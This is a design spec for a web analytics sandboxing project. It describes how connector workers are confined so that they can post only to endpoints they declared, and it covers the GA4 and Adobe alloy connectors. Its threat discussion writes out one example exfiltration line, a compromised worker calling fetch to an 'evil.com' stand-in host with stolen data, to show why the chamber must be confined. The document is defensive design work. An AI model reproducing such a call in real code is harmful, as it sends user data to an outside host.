---
status: DONE
skill:
use_cases: [UC-1, UC-2]
---

<!-- jig self-defining vocabulary (soft, forward-only): expand each acronym on first use and link the term to docs/memory/glossary.md. -->

# Spec 016: endpoint-ceiling enforcement — a chamber can only post where it declared

## Overview

MVP3's **second enforcement spec**: make the connector manifest's `endpoints` a **ceiling it can
never exceed** ([ADR-0006](../../decisions/adr-0006-capability-manifest.md) Option B, the
`granted = declared ∩ host-policy ∩ consent` law). Today `endpoints` is **declared but advisory** —
the connector *announces* where it posts but is **not held to it**. This spec flips the **`declared`**
term to authoritative at the egress seam: a chamber can only post to a destination it **declared**, and
an undeclared destination is **held at the seal** + surfaced (009-02), never a silent drop and never a
chamber-killing throw (ADR-0006 §Consequences).

**A ceiling has TEETH only where the chamber's egress is CONFINED to the gated seam (016-01/02
frame-critique — the load-bearing lesson).** Gating a dispatch chokepoint does nothing against a
compromised chamber if the chamber can reach the network *around* the chokepoint. Grounded state:
- **alloy is confined** — `connectors/alloy/egress-confinement.js` (`applyEgressConfinement`) withholds
  every ambient network primitive (XHR/WebSocket/EventSource/WebTransport/Worker/caches/sendBeacon) and
  leaves only the **mediated** `fetch` (which posts `intercepted-fetch` to main). So the wrapped-SDK
  dispatch seam **is** alloy's sole egress → the ceiling there has teeth. `016-02`.
- **GA4 is NOT confined** — `core/chamber.worker.js` (the GA4 chamber) strips nothing; a compromised GA4
  `handle` can call `self.fetch("https://evil.com", { body: <stolen> })` in-worker, never populate its
  `ready` array, and the async dispatch seam never sees it. So gating `worker.onmessage`'s `fetch(r.url)`
  **alone** is theater against a compromised GA4 chamber. **This spec therefore FOLDS IN GA4-chamber
  egress-confinement** (withhold the GA4 chamber's ambient network so its `ready` postMessage is the
  **sole** egress) as the foundation the GA4 ceiling stands on — decided 2026-08-30. `016-01`.

**A grounded framing correction (kept from the first draft).** ADR-0006 argues the flip "adds ~zero over
ADR-0004's host allow-list, which already blocks foreign sinks." **That host allow-list was never
built** — grep-verified: `core/` has **no** egress-destination gate (`core/airlock.js`'s worker-dispatch
is a bare `fetch(r.url)`; the only destination-adjacent check is 015's config-integrity at the
wrapped-SDK seam — see below). So the declared-`endpoints` ceiling is the **first** egress-destination
gate; the `∩ host-policy` (a future host-owned allow-list) and `∩ consent` (ADR-0007) terms are
additional intersections deferred to their own specs. Absent a host-policy config, the enforced set **is**
the declared set.

**Granularity = origin + pathname — with a NAMED tenant-in-query residual.** The ceiling compares the
outbound **origin + pathname**, dropping query/fragment. This resolves ADR-0006 **Kill #4** (a
site-configured deploy-time URL carrying `measurement_id`/`api_secret`/cluster-hint query params must not
break the ceiling) and keeps secrets out of the manifest/disclosure label. **But dropping the query has a
cost the spec must name (016-01 frame-critique):** a connector's **tenant key often rides in the query**
— GA4's `measurement_id`, alloy's `configId` — so an origin+path ceiling **cannot** distinguish "our
tenant" from "an attacker's tenant on the same origin+path." That **same-host tenant re-route** is exactly
what **config-integrity (spec 015)** governs for alloy and **explicitly deferred for GA4**. So the
endpoint ceiling and config-integrity are **complementary, non-overlapping controls**, and GA4's tenant
re-route stays a **named residual** (the deferred GA4 config-integrity), not something the ceiling closes.

**Two controls, two axes — the wrapped-SDK seam reconciliation (016-02 frame-critique).** The first draft
mis-called config-integrity a "tenant-only pin." It is **not**: `core/config-integrity.js` also holds any
`host !== pinnedHost` (a single-host destination check, added by 015's own frame-critique because no
ceiling existed yet). Composing that single-host check with a set-based ceiling naively ("both run on
every egress, both must pass") is **incoherent** — it would hold a second legitimately-declared origin,
and config-integrity's "absent tenant key → hold" would wrongly hold a non-interact request. So 016-02
**reconciles the axes**:
- the **endpoint ceiling owns HOST+PATH** — it runs on **every** intercepted egress and is the
  set-based destination authority (it subsumes config-integrity's single-host check *when present*);
- **config-integrity owns the TENANT** — its tenant check runs on the **tenant-bearing interact**
  endpoint (its `pinnedHost`), the ceiling having already confirmed the host. 015's control code is
  **unchanged** (its standalone tests pass no ceiling and are untouched); the reconciliation is a
  **composition-seam** behavior when both controls are present.

**Not in scope:** the `∩ host-policy` host-owned allow-list layer; `∩ consent` purpose-vector (ADR-0007);
the **payload** channel (OQ11 denylist — *what* a chamber packs into a declared endpoint); the sync-path
throwing-mapper isolation (OQ16); GA4's tenant-in-query re-route (deferred config-integrity — named
residual). This spec is the destination ceiling's `declared` term + the confinement it requires to bite.

## Assumptions

<!-- Grounded 2026-08-30 by reading core/airlock.js, core/egress.js, core/wrapped-sdk-host.js,
     core/config-integrity.js, connectors/alloy/egress-confinement.js, connectors/{ga4,alloy}/connector.js,
     contracts/connector.d.ts, test/alloy-manifest-declaration.test.js, ADR-0004/0006; risk-gated. -->

- **No egress-destination allow-list exists in `core/` today** (grep-verified). This ceiling is the first
  destination gate. **Grounded.**
- **GA4's chamber is not network-confined; alloy's is.** `core/chamber.worker.js` strips nothing and
  retains ambient `fetch`/XHR; `applyEgressConfinement` is wired into alloy only. So the GA4 ceiling needs
  confinement folded in to have teeth. **Grounded** (016-01 frame-critique + reading both chambers).
- **`applyEgressConfinement` PRESERVES `fetch`** (alloy's mediated surface) and withholds the rest. GA4's
  chamber `fetch` is **not** mediated (GA4's egress is the `ready` postMessage), so confining GA4 must
  withhold `fetch` **too** — a GA4-specific step. The GA4 chamber uses no ambient network on the honest
  path (its `handle` maps + returns `ready`), so withholding it is safe — **to be re-verified in
  implementation** by reading `core/connector-host.js` + `connectors/ga4/connector.js`. **Partially
  grounded** (read the confinement primitive; the GA4 no-network claim is verified against the connector
  but re-checked at wiring time).
- **config-integrity (015) is a single-host + tenant control, not tenant-only** (`core/config-integrity.js`
  holds `host !== pinnedHost`). The 016-02 composition reconciles the host axis into the ceiling.
  **Grounded.**
- **The async worker path's url is chamber-produced; the sync path's is config-pinned.** `core/airlock.js`
  dispatches `r.url` (chamber-chosen `ready`); `core/egress.js` dispatches `endpoints[t]` (host config,
  main-thread). So the ceiling gates the async seam; the sync path's destination is confined by
  construction. **Grounded.**
- **GA4's declared `endpoints` == config endpoints == post targets** (`connectors/ga4/connector.js`).
  **Grounded.**
- **`EgressRequest` carries no connector/chamber id** (`contracts/connector.d.ts:61`). Attribution is
  implicit in the single-connector-per-host model, threaded at construction. Multi-chamber attribution is
  forward-looking. **Grounded.**
- **alloy's chamber egress origins at origin+pathname are NOT yet chamber-grounded.** 013-02 measured
  **2 first-party origins** (`adobedc.demdex.net` + `edge.adobedc.net`) in a **real-DOM main-thread**
  reference run — **not** the confined chamber. So 016-02 declares the **grounded interact origin** as the
  enforced floor and treats any further origin as **held + surfaced** by the ceiling (the FLOOR:
  operator-declares-if-legit); a chamber-grounded egress probe to pre-declare the full set is a tracked
  follow-up. **Grounded** as a lower bound (013-02 §Findings), honest about the chamber gap.

## Decomposition

SPIDR = **Rules (R)** — a gating rule (the `endpoints` ceiling) enforced at an egress seam, plus the
**confinement** that gives the rule teeth. Split by **connector archetype** (a Data-shaped axis — the two
archetypes carry fundamentally different egress *data* and confinement state): the wire-protocol archetype
first (GA4 — fold in confinement + the exact ceiling, establishing the generic `core/` mechanism), then
the CDP archetype (alloy — already-confined seam + the ceiling reconciled with config-integrity, a FLOOR
endpoint set). Each binds the rule **end-to-end at a real seam** (a compromised chamber's undeclared /
around-the-seam egress → held), so neither is horizontal.

- **016-01 `[R]` GA4: confine the chamber + wire-protocol endpoint ceiling (the EXACT archetype)** — fold
  in **GA4-chamber egress-confinement** (withhold ambient `fetch`/XHR so the `ready` postMessage is the
  **sole** egress) + a generic vendor-neutral `core/` endpoint-ceiling control (origin+pathname ∈ the
  host connector's declared endpoints, else HOLD + 009-02 alert) wired into the async worker dispatch
  seam. **Together = real foreign-sink teeth**: a compromised GA4 chamber attempting a direct in-worker
  `self.fetch` is **denied** (confinement) and an undeclared `ready` destination is **held** (ceiling).
  The sync path's config-pinned destination gets an invariant assertion (not a gate). Named residual:
  the tenant-in-query re-route (GA4 `measurement_id`) — the deferred GA4 config-integrity.
- **016-02 `[R]` alloy: wrapped-SDK endpoint ceiling reconciled with config-integrity (the FLOOR
  archetype)** — apply the same `core/` control at the **already-confined** wrapped-SDK seam
  (`core/wrapped-sdk-host.js`), **reconciled** with 015's config-integrity (ceiling owns host+path on all
  egress; config-integrity owns the tenant on the interact — a composition-seam behavior, 015 code
  unchanged); flip the 012-04 **boundary sentinel**; declare the **grounded interact origin** as the
  enforced floor, with any further chamber egress **held + surfaced** (the FLOOR — server-directed
  demdex/AAM sync + the un-chamber-grounded second origin are named residuals, not claimed confined).

## Slices

1. [016-01 — GA4: confine the chamber + wire-protocol endpoint ceiling (exact)](slice-01-ga4-wire-protocol-ceiling.md)
2. [016-02 — alloy: wrapped-SDK endpoint ceiling reconciled with config-integrity (floor)](slice-02-alloy-wrapped-sdk-floor.md)
